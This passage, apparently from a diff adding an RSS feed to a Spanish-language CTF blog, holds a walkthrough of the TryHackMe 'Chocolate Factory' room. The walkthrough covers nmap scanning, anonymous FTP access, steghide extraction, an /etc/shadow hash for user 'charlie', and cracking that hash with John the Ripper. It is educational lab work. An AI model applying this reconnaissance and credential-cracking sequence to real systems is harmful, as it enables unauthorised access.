+&lt;p&gt;¡Ya somos root!&lt;/p&gt;
+&lt;p&gt;Con un cat /root/root.txt podemos ver la flag&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución Chocolate Factory</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/</link>
+        <pubDate>Tue, 13 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/1.jpg" alt="Featured image of post Resolución Chocolate Factory" /&gt;&lt;p&gt;Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/chocolatefactory&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/chocolatefactory&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.250.47&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.250.47
+PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data.
+64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms
+
+--- 10.10.250.47 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h2 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h2&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.250.47 -oG allPort
+PORT    STATE SERVICE    REASON
+21/tcp  open  ftp        syn-ack ttl 63
+22/tcp  open  ssh        syn-ack ttl 63
+80/tcp  open  http       syn-ack ttl 63
+100/tcp open  newacct    syn-ack ttl 63
+101/tcp open  hostname   syn-ack ttl 63
+102/tcp open  iso-tsap   syn-ack ttl 63
+103/tcp open  gppitnp    syn-ack ttl 63
+104/tcp open  acr-nema   syn-ack ttl 63
+105/tcp open  csnet-ns   syn-ack ttl 63
+106/tcp open  pop3pw     syn-ack ttl 63
+107/tcp open  rtelnet    syn-ack ttl 63
+108/tcp open  snagas     syn-ack ttl 63
+109/tcp open  pop2       syn-ack ttl 63
+110/tcp open  pop3       syn-ack ttl 63
+111/tcp open  rpcbind    syn-ack ttl 63
+112/tcp open  mcidas     syn-ack ttl 63
+113/tcp open  ident      syn-ack ttl 63
+114/tcp open  audionews  syn-ack ttl 63
+115/tcp open  sftp       syn-ack ttl 63
+116/tcp open  ansanotify syn-ack ttl 63
+117/tcp open  uucp-path  syn-ack ttl 63
+118/tcp open  sqlserv    syn-ack ttl 63
+119/tcp open  nntp       syn-ack ttl 63
+120/tcp open  cfdptkt    syn-ack ttl 63
+121/tcp open  erpc       syn-ack ttl 63
+122/tcp open  smakynet   syn-ack ttl 63
+123/tcp open  ntp        syn-ack ttl 63
+124/tcp open  ansatrader syn-ack ttl 63
+125/tcp open  locus-map  syn-ack ttl 63
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;───────┬──────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼──────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.250.47
+   5   │     [*] Open ports: 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,
+       │ 113,114,115,116,117,118,119,120,121,122,123,124,125
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴──────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.250.47 -oN target
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.10.10
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 1631bbfb51fcccc12148ff0d833b0089b (RSA)
+|   256 e71fc9dbj3eaa44b672103ceedb1d3390 (ECDSA)
+|_  256 b44502b62478gea9065f6c79448a06555e (ED25519)
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+100/tcp open  newacct?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+101/tcp open  hostname?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+102/tcp open  iso-tsap?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+103/tcp open  gppitnp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+104/tcp open  acr-nema?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+105/tcp open  csnet-ns?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+106/tcp open  pop3pw?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+107/tcp open  rtelnet?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+108/tcp open  snagas?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+109/tcp open  pop2?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+110/tcp open  pop3?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+111/tcp open  rpcbind?
+| fingerprint-strings: 
+|   NULL, RPCCheck: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+112/tcp open  mcidas?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+113/tcp open  ident?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, SMBProgNeg, TerminalServerCookie, oracle-tns: 
+|_    http://localhost/key_rev_key &amp;lt;- You will find the key here!!!
+114/tcp open  audionews?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+115/tcp open  sftp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+116/tcp open  ansanotify?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+117/tcp open  uucp-path?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+118/tcp open  sqlserv?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+119/tcp open  nntp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+120/tcp open  cfdptkt?
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+121/tcp open  erpc?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+122/tcp open  smakynet?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+123/tcp open  ntp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+124/tcp open  ansatrader?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+125/tcp open  locus-map?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-p&lt;/td&gt;
+&lt;td&gt;Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;puerto-80&#34;&gt;Puerto 80&lt;/h2&gt;
+&lt;p&gt;Con el whatweb podemos ver más información de la web&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ whatweb 10.10.250.47
+http://10.10.250.47 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.250.47], PasswordField[password]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al entrar a la web hay un panel de login, e probado con admin:admin y las típicas credenciales pero nada.&lt;/p&gt;
+&lt;p&gt;El wappalayzer no reporta nada interesante.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/login.png&#34;
+	width=&#34;742&#34;
+	height=&#34;639&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;116&#34;
+		data-flex-basis=&#34;278px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;puerto-21&#34;&gt;Puerto 21&lt;/h2&gt;
+&lt;p&gt;El nmap reporto que se podía entrar al puerto 21 como anónimo (&lt;code&gt;ftp-anon: Anonymous FTP login allowed&lt;/code&gt;)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ftp 10.10.250.47
+Connected to 10.10.250.47.
+220 (vsFTPd 3.0.3)
+Name (10.10.250.47:d3b0): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Dentro solo hay una foto &lt;code&gt;gum_room.jpg&lt;/code&gt;, con &lt;code&gt;get gum_room.jpg&lt;/code&gt; nos la podemos pasar a nuestra máquina, la foto es la siguiente:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/gum.png&#34;
+	width=&#34;1543&#34;
+	height=&#34;872&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;176&#34;
+		data-flex-basis=&#34;424px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Para ver si hay algo oculto en la foto usamos steghide&lt;/p&gt;
+&lt;p&gt;Steghide es un software de esteganografía de código abierto que permite ocultar un archivo secreto en un archivo de imagen o audio.&lt;/p&gt;
+&lt;p&gt;No notarás ningún cambio en la imagen o el archivo de audio. Sin embargo, el archivo secreto estará dentro de la imagen original o el archivo de audio. Es un software de línea de comando.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#Si no tienes instalado el &amp;quot;steghide&amp;quot; lo puedes descargar con
+sudo apt install steghide
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ steghide extract -sf gum_room.jpg
+Anotar salvoconducto: 
+anot� los datos extra�dos e/&amp;quot;b64.txt&amp;quot;.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora se a creado un archivo b64.txt que está encriptado con base64&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat b64.txt | base64 -d &amp;gt; decode.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora en el decode.txt ya está el contenido&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;...
+...
+charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Esto parece ser el /etc/shadow&lt;/p&gt;
+&lt;p&gt;El fichero /etc/shadow almacena las contraseñas de las cuentas de usuario. Se utiliza este fichero por seguridad. /etc/shadow es un archivo de texto que contiene información sobre las contraseñas de los usuarios del sistema. Es propiedad del usuario root y del grupo oculto&lt;/p&gt;
+&lt;p&gt;Al final de todo se puede ver el usuario charlie, junto a un hash sha512 (se puede saber que tipo es porque empieza con $6$)&lt;/p&gt;
+&lt;p&gt;Para romper el hash vamos a usar John the Ripper, que es una herramienta para recuperación de contraseñas. Originalmente desarrollado para el sistema operativo Unix&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo apt install john
+echo &amp;quot;hash&amp;quot; &amp;gt; myhash.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt mihash.hash
+john --show mihash.hash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;homephp&#34;&gt;home.php&lt;/h2&gt;
+&lt;p&gt;Esto nos devuelve el usuario charlie con la contraseña, al probarlos en la web, nos lleva a otra página.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/remote.png&#34;
+	width=&#34;657&#34;
+	height=&#34;360&#34;
